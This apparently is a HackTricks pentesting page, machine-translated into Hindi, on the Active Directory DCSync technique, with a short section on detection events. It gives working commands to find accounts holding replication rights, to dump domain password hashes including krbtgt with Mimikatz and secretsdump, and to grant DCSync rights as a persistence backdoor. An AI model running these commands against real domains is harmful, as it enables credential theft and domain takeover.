# DCSync

<figure><img src="../../.gitbook/assets/image (48).png" alt=""><figcaption></figcaption></figure>

\
[**Trickest**](https://trickest.com/?utm_source=hacktricks&utm_medium=text&utm_campaign=ppc&utm_term=trickest&utm_content=dcsync) का उपयोग करें और **ऑटोमेट वर्कफ़्लो** बनाने के लिए **दुनिया के सबसे उन्नत** समुदाय उपकरणों द्वारा संचालित करें।\
आज ही पहुंच प्राप्त करें:

{% embed url="https://trickest.com/?utm_source=hacktricks&utm_medium=banner&utm_campaign=ppc&utm_content=dcsync" %}

<details>

<summary><strong>जानें AWS हैकिंग को शून्य से हीरो तक</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

HackTricks का समर्थन करने के अन्य तरीके:

* यदि आप अपनी कंपनी की **विज्ञापनित करना चाहते हैं HackTricks** या **HackTricks को PDF में डाउनलोड करना चाहते हैं** तो [**सदस्यता योजनाएँ देखें**](https://github.com/sponsors/carlospolop)!
* [**आधिकारिक PEASS & HackTricks स्वैग**](https://peass.creator-spring.com) प्राप्त करें
* हमारे विशेष [**NFTs**](https://opensea.io/collection/the-peass-family) संग्रह [**The PEASS Family**](https://opensea.io/collection/the-peass-family) खोजें
* **शामिल हों** 💬 [**डिस्कॉर्ड समूह**](https://discord.gg/hRep4RUj7f) या [**टेलीग्राम समूह**](https://t.me/peass) या हमें **ट्विटर** 🐦 [**@carlospolopm**](https://twitter.com/hacktricks\_live)** पर फॉलो** करें।
* **हैकिंग ट्रिक्स साझा करें द्वारा PRs सबमिट करके** [**HackTricks**](https://github.com/carlospolop/hacktricks) और [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>

## DCSync

**DCSync** अनुमति इसका सिद्धांत है कि डोमेन इसके ऊपर ये अनुमतियाँ होना चाहिए: **DS-Replication-Get-Changes**, **Replicating Directory Changes All** और **Replicating Directory Changes In Filtered Set**।

**DCSync के बारे में महत्वपूर्ण नोट:**

* **DCSync हमला एक डोमेन कंट्रोलर के व्यवहार का अनुकरण करता है और अन्य डोमेन कंट्रोलर से जानकारी की प्रतिलिपि** मांगता है डायरेक्टरी रिप्लिकेशन सेवा रिमोट प्रोटोकॉल (MS-DRSR) का उपयोग करके। क्योंकि MS-DRSR एक मान्य और आवश्यक फ़ंक्शन है, इसे बंद नहीं किया जा सकता है या अक्षम किया जा सकता है।
* डिफ़ॉल्ट रूप से केवल **डोमेन व्यवस्थापक, एंटरप्राइज व्यवस्थापक, प्रशासक और डोमेन कंट्रोलर्स** समूहों के पास आवश्यक विशेषाधिकार होते हैं।
* यदि किसी खाते का पासवर्ड पलटने वाले एन्क्रिप्शन के साथ संग्रहीत है, तो Mimikatz में पासवर्ड को स्पष्ट पाठ में लौटाने का एक विकल्प उपलब्ध है

### गणना

`powerview` का उपयोग करके जांचें कि किसके पास ये अनुमतियाँ हैं:
```powershell
Get-ObjectAcl -DistinguishedName "dc=dollarcorp,dc=moneycorp,dc=local" -ResolveGUIDs | ?{($_.ObjectType -match 'replication-get') -or ($_.ActiveDirectoryRights -match 'GenericAll') -or ($_.ActiveDirectoryRights -match 'WriteDacl')}
```
### स्थानिक शोषण
```powershell
Invoke-Mimikatz -Command '"lsadump::dcsync /user:dcorp\krbtgt"'
```
### रूपांतरण दूरस्थिति
```powershell
secretsdump.py -just-dc <user>:<password>@<ipaddress> -outputfile dcsync_hashes
[-just-dc-user <USERNAME>] #To get only of that user
[-pwd-last-set] #To see when each account's password was last changed
[-history] #To dump password history, may be helpful for offline password cracking
```
`-just-dc` 3 फ़ाइलें उत्पन्न करता है:

* एक **NTLM हैश** के साथ
* एक **केरबेरोस कुंजी** के साथ
* NTDS से साफ पाठ के साथ एक जिसमें किसी भी खातों के लिए [**पलटाव एन्क्रिप्शन**](https://docs.microsoft.com/en-us/windows/security/threat-protection/security-policy-settings/store-passwords-using-reversible-encryption) सक्षम है। आप पलटाव एन्क्रिप्शन के साथ उपयोगकर्ताओं को प्राप्त कर सकते हैं

```powershell
Get-DomainUser -Identity * | ? {$_.useraccountcontrol -like '*ENCRYPTED_TEXT_PWD_ALLOWED*'} |select samaccountname,useraccountcontrol
```

### Persistence

यदि आप डोमेन व्यवस्थापक हैं, तो आप `powerview` की सहायता से किसी भी उपयोगकर्ता को इस अनुमतियों को प्रदान कर सकते हैं:
```powershell
Add-ObjectAcl -TargetDistinguishedName "dc=dollarcorp,dc=moneycorp,dc=local" -PrincipalSamAccountName username -Rights DCSync -Verbose
```
फिर, आप **यह जांच सकते हैं कि उपयोगकर्ता को सही ढंग से असाइन किया गया था** 3 विशेषाधिकारों की खोज करके (आपको "ObjectType" फ़ील्ड के अंदर विशेषाधिकारों के नाम देखने में सक्षम होना चाहिए):
```powershell
Get-ObjectAcl -DistinguishedName "dc=dollarcorp,dc=moneycorp,dc=local" -ResolveGUIDs | ?{$_.IdentityReference -match "student114"}
```
### निवारण

* सुरक्षा घटना आईडी 4662 (ऑब्जेक्ट के लिए ऑडिट नीति सक्षम होनी चाहिए) - एक ऑब्जेक्ट पर एक कार्रवाई की गई थी
* सुरक्षा घटना आईडी 5136 (ऑब्जेक्ट के लिए ऑडिट नीति सक्षम होनी चाहिए) - एक निर्देशिका सेवा ऑब्जेक्ट में संशोधन किया गया था
* सुरक्षा घटना आईडी 4670 (ऑब्जेक्ट के लिए ऑडिट नीति सक्षम होनी चाहिए) - एक ऑब्जेक्ट पर अनुमतियाँ बदल दी गई थी
* AD ACL स्कैनर - ACLs के निर्माण और तुलनात्मक रिपोर्ट बनाएं। [https://github.com/canix1/ADACLScanner](https://github.com/canix1/ADACLScanner)

## संदर्भ

* [https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/dump-password-hashes-from-domain-controller-with-dcsync](https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/dump-password-hashes-from-domain-controller-with-dcsync)
* [https://yojimbosecurity.ninja/dcsync/](https://yojimbosecurity.ninja/dcsync/)

<details>

<summary><strong>जानें AWS हैकिंग को शून्य से हीरो तक</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong> के साथ!</strong></summary>
Other ways to support HackTricks:

* यदि आप अपनी **कंपनी का विज्ञापन HackTricks में देखना चाहते हैं** या **HackTricks को PDF में डाउनलोड करना चाहते हैं** तो [**सब्सक्रिप्शन प्लान्स**](https://github.com/sponsors/carlospolop) देखें!
* [**आधिकारिक PEASS & HackTricks स्वैग**](https://peass.creator-spring.com) प्राप्त करें
* [**The PEASS Family**](https://opensea.io/collection/the-peass-family) की खोज करें, हमारा विशेष [**NFTs**](https://opensea.io/collection/the-peass-family) संग्रह
* **शामिल हों** 💬 [**Discord समूह**](https://discord.gg/hRep4RUj7f) या [**टेलीग्राम समूह**](https://t.me/peass) या हमें **Twitter** पर **फॉलो** करें 🐦 [**@carlospolopm**](https://twitter.com/hacktricks\_live)**.**
* **अपने हैकिंग ट्रिक्स साझा करें, HackTricks** [**HackTricks**](https://github.com/carlospolop/hacktricks) और [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos में PRs सबमिट करके।

</details>

<figure><img src="../../.gitbook/assets/image (48).png" alt=""><figcaption></figcaption></figure>

\
[**Trickest**](https://trickest.com/?utm_source=hacktricks&utm_medium=text&utm_campaign=ppc&utm_term=trickest&utm_content=dcsync) का उपयोग करें और आसानी से **वर्ल्ड के सबसे उन्नत समुदाय उपकरणों द्वारा संचालित** **ऑटोमेट वर्कफ़्लो** बनाएं।\
आज ही पहुंच प्राप्त करें:

{% embed url="https://trickest.com/?utm_source=hacktricks&utm_medium=banner&utm_campaign=ppc&utm_content=dcsync" %}
